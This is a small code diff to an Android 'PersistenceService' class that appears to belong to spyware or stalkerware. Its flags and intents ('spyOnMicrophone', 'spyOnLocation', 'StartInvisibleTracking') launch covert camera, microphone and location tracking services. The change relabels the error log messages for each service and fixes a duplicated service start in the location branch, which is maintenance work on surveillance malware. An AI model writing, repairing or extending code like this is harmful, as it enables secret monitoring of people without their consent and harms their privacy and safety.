@@ -131,7 +131,7 @@ public class PersistenceService extends Service {
                 ctx.startForegroundService(intent);
             }
         }catch (Exception e){
-            Log.e(TAG, "Error starting Service: " + e.getMessage());
+            Log.e(TAG, "Error starting Cam-Service: " + e.getMessage());
         }
         try{
             if(spyOnMicrophone && !MicrophoneService.isIsRecording()){
@@ -140,16 +140,16 @@ public class PersistenceService extends Service {
                 ctx.startForegroundService(intent);
             }
         }catch (Exception e){
-            Log.e(TAG, "Error starting Service: " + e.getMessage());
+            Log.e(TAG, "Error starting Mic-Service: " + e.getMessage());
         }
         try{
             if(spyOnLocation){
                 intent = new Intent("StartInvisibleTracking");
                 intent.setPackage(ctx.getPackageName());
                 ctx.startForegroundService(intent);
-            } ctx.startForegroundService(intent);
+            }
         }catch (Exception e){
-            Log.e(TAG, "Error starting Service: " + e.getMessage());
+            Log.e(TAG, "Error starting Loc-Service: " + e.getMessage());
         }
     }
 }
